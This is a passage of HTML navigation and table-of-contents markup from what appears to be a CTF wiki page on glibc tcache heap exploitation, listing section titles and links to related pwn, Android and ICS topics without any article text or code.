    <a href="../use_after_free-zh/" class="md-nav__link">
      Use After Free
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../fastbin_attack-zh/" class="md-nav__link">
      Fastbin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../unsorted_bin_attack-zh/" class="md-nav__link">
      Unsorted Bin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../large_bin_attack-zh/" class="md-nav__link">
      Large Bin Attack
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Tcache Attack
        <span class="md-nav__icon md-icon"></span>
      </label>
    
    <a href="./" class="md-nav__link md-nav__link--active">
      Tcache Attack
    </a>
    
      
<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#tcache-makes-heap-exploitation-easy-again" class="md-nav__link">
    tcache makes heap exploitation easy again
  </a>
  
    <nav class="md-nav" aria-label="tcache makes heap exploitation easy again">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#0x01-tcache-overview" class="md-nav__link">
    0x01 Tcache overview
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x02-tcache-usage" class="md-nav__link">
    0x02 Tcache Usage
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x03-pwn-tcache" class="md-nav__link">
    0x03 Pwn Tcache
  </a>
  
    <nav class="md-nav" aria-label="0x03 Pwn Tcache">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#tcache-poisoning" class="md-nav__link">
    tcache poisoning
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcache-dup" class="md-nav__link">
    tcache dup
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcache-perthread-corruption" class="md-nav__link">
    tcache perthread corruption
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcache-house-of-spirit" class="md-nav__link">
    tcache house of spirit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smallbin-unlink" class="md-nav__link">
    smallbin unlink
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcache-stashing-unlink-attack" class="md-nav__link">
    tcache stashing unlink attack
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libc-leak" class="md-nav__link">
    libc leak
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x04-tcache-check" class="md-nav__link">
    0x04 Tcache Check
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x05-the-pwn-of-ctf" class="md-nav__link">
    0x05 The pwn of CTF
  </a>
  
    <nav class="md-nav" aria-label="0x05 The pwn of CTF">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#challenge-1-lctf2018-pwn-easy_heap" class="md-nav__link">
    Challenge 1 : LCTF2018 PWN easy_heap
  </a>
  
    <nav class="md-nav" aria-label="Challenge 1 : LCTF2018 PWN easy_heap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    利用思路
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    利用步骤
  </a>
  
    <nav class="md-nav" aria-label="利用步骤">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#unsorted-bin-chunk" class="md-nav__link">
    重排堆块结构，释放出 unsorted bin chunk
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#null" class="md-nav__link">
    按照解析中的步骤进行 NULL 字节溢出触发
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    地址泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcache-uaf-attack" class="md-nav__link">
    tcache UAF attack
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    完整 exploit
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-2-hitcon-2018-pwn-baby_tcache" class="md-nav__link">
    Challenge 2 : HITCON 2018 PWN baby_tcache
  </a>
  
    <nav class="md-nav" aria-label="Challenge 2 : HITCON 2018 PWN baby_tcache">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    利用思路
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    操作过程
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-2" class="md-nav__link">
    Challenge 2 小结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-3-2014-hitcon-stkof" class="md-nav__link">
    Challenge 3 : 2014 HITCON stkof
  </a>
  
    <nav class="md-nav" aria-label="Challenge 3 : 2014 HITCON stkof">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libc-226-tcache" class="md-nav__link">
    libc 2.26 tcache 利用方法
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-4-hitcon-2019-one_punch_man" class="md-nav__link">
    Challenge 4 : HITCON 2019 one_punch_man
  </a>
  
    <nav class="md-nav" aria-label="Challenge 4 : HITCON 2019 one_punch_man">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_11" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_13" class="md-nav__link">
    利用思路
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_14" class="md-nav__link">
    利用步骤
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x06" class="md-nav__link">
    0x06 建议习题：
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_einherjar-zh/" class="md-nav__link">
      House of Einherjar
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_force-zh/" class="md-nav__link">
      House of Force
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_lore-zh/" class="md-nav__link">
      House of Lore
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_orange-zh/" class="md-nav__link">
      House of Orange
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_rabbit-zh/" class="md-nav__link">
      House of Rabbit
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_roman-zh/" class="md-nav__link">
      House of Roman
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-5" type="checkbox" id="nav-8-2-5">
    
    <label class="md-nav__link" for="nav-8-2-5">
      IO_FILE Related
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="IO_FILE Related" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-5">
        <span class="md-nav__icon md-icon"></span>
        IO_FILE Related
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/introduction-zh/" class="md-nav__link">
      FILE Structure Description
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fake-vtable-exploit-zh/" class="md-nav__link">
      Forged Vtable to Hijack Control Flow
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fsop-zh/" class="md-nav__link">
      FSOP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/exploit-in-libc2.24-zh/" class="md-nav__link">
      Use of IO_FILE Under Glibc 2.24
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-6" type="checkbox" id="nav-8-2-6">
    
    <label class="md-nav__link" for="nav-8-2-6">
      Race Condition
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Race Condition" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-6">
        <span class="md-nav__icon md-icon"></span>
        Race Condition
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/introduction-zh/" class="md-nav__link">
      Race Condition Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/problem-zh/" class="md-nav__link">
      Example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-7" type="checkbox" id="nav-8-2-7">
    
    <label class="md-nav__link" for="nav-8-2-7">
      Integer Overflow
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Integer Overflow" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-7">
        <span class="md-nav__icon md-icon"></span>
        Integer Overflow
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../integeroverflow/intof-zh/" class="md-nav__link">
      Introduction to The Principle of Integer Overflow
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-8" type="checkbox" id="nav-8-2-8">
    
    <label class="md-nav__link" for="nav-8-2-8">
      Sandbox Escape
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Sandbox Escape" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-8">
        <span class="md-nav__icon md-icon"></span>
        Sandbox Escape
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../sandbox/python-sandbox-escape-zh/" class="md-nav__link">
      Python Sandbox Escape
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-9" type="checkbox" id="nav-8-2-9">
    
    <label class="md-nav__link" for="nav-8-2-9">
      Linux Kernel
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linux Kernel" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-9">
        <span class="md-nav__icon md-icon"></span>
        Linux Kernel
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/environment-zh/" class="md-nav__link">
      Environment Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/basic_knowledge-zh/" class="md-nav__link">
      Basics
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/kernel_uaf-zh/" class="md-nav__link">
      Kernel-UAF
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/kernel_rop-zh/" class="md-nav__link">
      Kernel-ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/ret2usr-zh/" class="md-nav__link">
      ret2usr
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/bypass_smep-zh/" class="md-nav__link">
      bypass-smep
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/double-fetch-zh/" class="md-nav__link">
      Double Fetch
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-10" type="checkbox" id="nav-8-2-10">
    
    <label class="md-nav__link" for="nav-8-2-10">
      arm-pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="arm-pwn" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-10">
        <span class="md-nav__icon md-icon"></span>
        arm-pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../arm/environment-zh/" class="md-nav__link">
      Environment Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../arm/arm_rop-zh/" class="md-nav__link">
      arm-rop
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-11" type="checkbox" id="nav-8-2-11">
    
    <label class="md-nav__link" for="nav-8-2-11">
      Summary
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Summary" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-11">
        <span class="md-nav__icon md-icon"></span>
        Summary
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../summary/get-address-zh/" class="md-nav__link">
      Address Leaking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../summary/hijack-control-flow-zh/" class="md-nav__link">
      Hijack Control Flow
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../summary/get-shell-zh/" class="md-nav__link">
      Get Shell
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-3" type="checkbox" id="nav-8-3">
    
    <label class="md-nav__link" for="nav-8-3">
      Windows Pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Windows Pwn" data-md-level="2">
      <label class="md-nav__title" for="nav-8-3">
        <span class="md-nav__icon md-icon"></span>
        Windows Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/readme-zh/" class="md-nav__link">
      Overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-3-2" type="checkbox" id="nav-8-3-2">
    
    <label class="md-nav__link" for="nav-8-3-2">
      Stack Overflow
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Stack Overflow" data-md-level="3">
      <label class="md-nav__title" for="nav-8-3-2">
        <span class="md-nav__icon md-icon"></span>
        Stack Overflow
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/stackoverflow/stack-introduce-zh/" class="md-nav__link">
      Stack Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/stackoverflow/stackoverflow-basic-zh/" class="md-nav__link">
      Stack Overflow Principle
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/stackoverflow/shellcode-in-stack-zh/" class="md-nav__link">
      shellcode-in-stack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9" type="checkbox" id="nav-9">
    
    <label class="md-nav__link" for="nav-9">
      Android
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android" data-md-level="1">
      <label class="md-nav__title" for="nav-9">
        <span class="md-nav__icon md-icon"></span>
        Android
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_develop/basic_develop-zh/" class="md-nav__link">
      Android Development Basics
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2" type="checkbox" id="nav-9-2">
    
    <label class="md-nav__link" for="nav-9-2">
      Android Application Operating Mechanism Brief
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Application Operating Mechanism Brief" data-md-level="2">
      <label class="md-nav__title" for="nav-9-2">
        <span class="md-nav__icon md-icon"></span>
        Android Application Operating Mechanism Brief
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/readme-zh/" class="md-nav__link">
      Basics
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-2" type="checkbox" id="nav-9-2-2">
    
    <label class="md-nav__link" for="nav-9-2-2">
      The Operating Mechanism of the Java Layer in Android
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="The Operating Mechanism of the Java Layer in Android" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-2">
        <span class="md-nav__icon md-icon"></span>
        The Operating Mechanism of the Java Layer in Android
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/readme-zh/" class="md-nav__link">
      Andriod Native
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/smali/smali-zh/" class="md-nav__link">
      Smali Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-2-3" type="checkbox" id="nav-9-2-2-3">
    
    <label class="md-nav__link" for="nav-9-2-2-3">
      Dex and ODEX
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Dex and ODEX" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-2-3">
        <span class="md-nav__icon md-icon"></span>
        Dex and ODEX
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/dex/dex-zh/" class="md-nav__link">
      DEX
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/dex/odex-zh/" class="md-nav__link">
      ODEX
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-3" type="checkbox" id="nav-9-2-3">
    
    <label class="md-nav__link" for="nav-9-2-3">
      Android Native Layer Introduction
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Native Layer Introduction" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-3">
        <span class="md-nav__icon md-icon"></span>
        Android Native Layer Introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/native_layer/so-zh/" class="md-nav__link">
      Android SO
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-4" type="checkbox" id="nav-9-2-4">
    
    <label class="md-nav__link" for="nav-9-2-4">
      Android Reverse Basic Introduction
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Reverse Basic Introduction" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-4">
        <span class="md-nav__icon md-icon"></span>
        Android Reverse Basic Introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/overview-zh/" class="md-nav__link">
      Brief Description
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/android_code_location-zh/" class="md-nav__link">
      Android Key Part Location
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-4-3" type="checkbox" id="nav-9-2-4-3">
    
    <label class="md-nav__link" for="nav-9-2-4-3">
      Android Simple Static Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Simple Static Analysis" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-4-3">
        <span class="md-nav__icon md-icon"></span>
        Android Simple Static Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/static/java-example-zh/" class="md-nav__link">
      Android Java Layer Static Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/static/so-example-zh/" class="md-nav__link">
      Android Native Layer Static Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/static/complex-example-zh/" class="md-nav__link">
      Android Static Analysis Hybrid Example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-4-4" type="checkbox" id="nav-9-2-4-4">
    
    <label class="md-nav__link" for="nav-9-2-4-4">
      Android Simple Dynamic Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Simple Dynamic Analysis" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-4-4">
        <span class="md-nav__icon md-icon"></span>
        Android Simple Dynamic Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/dynamic/dynamic_debug-zh/" class="md-nav__link">
      Dynamic Debugging
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/dynamic/ida_native_debug-zh/" class="md-nav__link">
      Android Dynamic Debugging SO
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-10" type="checkbox" id="nav-10">
    
    <label class="md-nav__link" for="nav-10">
      ICS
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="ICS" data-md-level="1">
      <label class="md-nav__title" for="nav-10">
        <span class="md-nav__icon md-icon"></span>
        ICS
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/ctfs-zh/" class="md-nav__link">
      ICS_CTF Contest
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/discover-zh/" class="md-nav__link">
      ICS_CTF found
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/exploit-zh/" class="md-nav__link">
      ICS_CTF uses
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/learn-zh/" class="md-nav__link">
      ICS_CTF Learning Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#tcache-makes-heap-exploitation-easy-again" class="md-nav__link">
    tcache makes heap exploitation easy again
  </a>
  
    <nav class="md-nav" aria-label="tcache makes heap exploitation easy again">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#0x01-tcache-overview" class="md-nav__link">
    0x01 Tcache overview
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x02-tcache-usage" class="md-nav__link">
    0x02 Tcache Usage
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x03-pwn-tcache" class="md-nav__link">
    0x03 Pwn Tcache
  </a>
  
    <nav class="md-nav" aria-label="0x03 Pwn Tcache">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#tcache-poisoning" class="md-nav__link">
    tcache poisoning
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcache-dup" class="md-nav__link">
    tcache dup
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcache-perthread-corruption" class="md-nav__link">
    tcache perthread corruption
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcache-house-of-spirit" class="md-nav__link">
    tcache house of spirit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smallbin-unlink" class="md-nav__link">
    smallbin unlink
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcache-stashing-unlink-attack" class="md-nav__link">
    tcache stashing unlink attack
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libc-leak" class="md-nav__link">
    libc leak
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x04-tcache-check" class="md-nav__link">
    0x04 Tcache Check
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x05-the-pwn-of-ctf" class="md-nav__link">
    0x05 The pwn of CTF
  </a>
  
    <nav class="md-nav" aria-label="0x05 The pwn of CTF">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#challenge-1-lctf2018-pwn-easy_heap" class="md-nav__link">
    Challenge 1 : LCTF2018 PWN easy_heap
  </a>
  
    <nav class="md-nav" aria-label="Challenge 1 : LCTF2018 PWN easy_heap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    利用思路
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    利用步骤
  </a>
  
    <nav class="md-nav" aria-label="利用步骤">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#unsorted-bin-chunk" class="md-nav__link">
    重排堆块结构，释放出 unsorted bin chunk
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#null" class="md-nav__link">
    按照解析中的步骤进行 NULL 字节溢出触发
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    地址泄露
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcache-uaf-attack" class="md-nav__link">
    tcache UAF attack
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    完整 exploit
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-2-hitcon-2018-pwn-baby_tcache" class="md-nav__link">
    Challenge 2 : HITCON 2018 PWN baby_tcache
  </a>
  
    <nav class="md-nav" aria-label="Challenge 2 : HITCON 2018 PWN baby_tcache">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    利用思路
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    操作过程
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-2" class="md-nav__link">
    Challenge 2 小结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-3-2014-hitcon-stkof" class="md-nav__link">
    Challenge 3 : 2014 HITCON stkof
  </a>
  
    <nav class="md-nav" aria-label="Challenge 3 : 2014 HITCON stkof">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#libc-226-tcache" class="md-nav__link">
    libc 2.26 tcache 利用方法
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-4-hitcon-2019-one_punch_man" class="md-nav__link">
    Challenge 4 : HITCON 2019 one_punch_man
  </a>
  
